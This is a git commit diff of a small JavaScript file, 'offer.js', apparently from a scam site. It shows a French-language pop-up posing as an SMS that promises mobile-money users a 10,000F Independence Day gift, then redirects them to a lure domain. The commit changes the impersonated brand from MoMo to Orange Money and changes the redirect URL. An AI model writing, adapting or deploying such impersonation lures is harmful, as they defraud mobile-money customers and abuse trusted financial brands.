b89e78b6e8e983291d8d03f38177682663cd88d2
lagboyme <lagboy33+me@gmail.com>
2025-08-02 00:01:01 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = '10.000F'
-password=prompt('SMS: Félicitations, votre compte MoMo est qualifié pour recevoir le cadeau MoMo de 10 000F pour le Jour de lIndépendance. Veuillez cliquer sur OK pour CONTINUER. ','10.000F');
+password=prompt('SMS: Félicitations, votre compte Orange Money est qualifié pour recevoir le cadeau MoMo de 10.000F pour le Jour de lIndépendance. Veuillez cliquer sur OK pour CONTINUER. ','10.000F');
 if (password != '10.000F') {
-location.href='https://momo-benin.alloffer.pro/gift';
+location.href='https://orange-money.offer-it.live/gift';
 }
+
